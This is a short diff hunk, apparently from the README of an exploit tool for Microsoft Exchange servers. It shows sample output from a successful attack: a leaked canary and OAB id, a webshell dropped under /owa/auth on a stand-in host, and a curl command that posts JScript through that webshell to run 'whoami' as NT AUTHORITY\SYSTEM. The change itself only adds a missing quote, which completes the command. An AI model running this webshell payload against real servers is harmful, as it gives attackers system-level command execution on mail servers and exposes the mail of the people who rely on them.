@@ -13,7 +13,7 @@ Got canary: rOWUk7lmAUC2-5HIlQ4EpGq1rPu959xxxxxxxxxx_xxxxxxx_xxx_a-KJ5WR-9j95yu-
 Got OAB id: 2f3d4600-xxxx-xxxx-xxxx-b4a4c1d3fb58
 Successful!
 (+) Webshell drop at https://mail.evil.corp/owa/auth/evilcorp.aspx
-(+) Enjoy your shell: curl -ik https://mail.evil.corp/owa/auth/evilcorp.aspx -d 'exec_code=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c whoami").stdout.readall())
+(+) Enjoy your shell: curl -ik https://mail.evil.corp/owa/auth/evilcorp.aspx -d 'exec_code=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c whoami").stdout.readall())'
 CMD: whoami
 nt authority\system
 ```
